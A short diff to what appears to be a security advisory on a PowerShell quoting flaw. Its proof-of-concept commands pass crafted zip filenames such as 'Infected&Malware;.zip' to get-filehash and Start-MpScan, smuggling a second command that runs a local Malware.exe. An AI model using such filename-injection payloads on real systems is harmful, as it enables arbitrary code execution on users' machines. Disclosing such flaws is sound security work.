@@ -7,7 +7,7 @@ Updated Dec 24, 2023 <br>
 Bypassing single quotes obstacle in PowerShell for code exec and bonus PS Windows Event log fail! <br>
 Semicolon and friend "&" operator join forces for arbitrary code exec capabilities. <br>
 
-Run some malware:
+Run some unwanted malware: <br>
 C:\Users\gg\Downloads>powershell get-filehash  'Infected&ScanMe;.zip'  -algorithm  md5 <br>
 Where Malware.exe lives in the same directory. <br>
 powershell Start-MpScan -Scanpath 'C:\Users\gg\Downloads\Infected&Malware;.zip' <br>
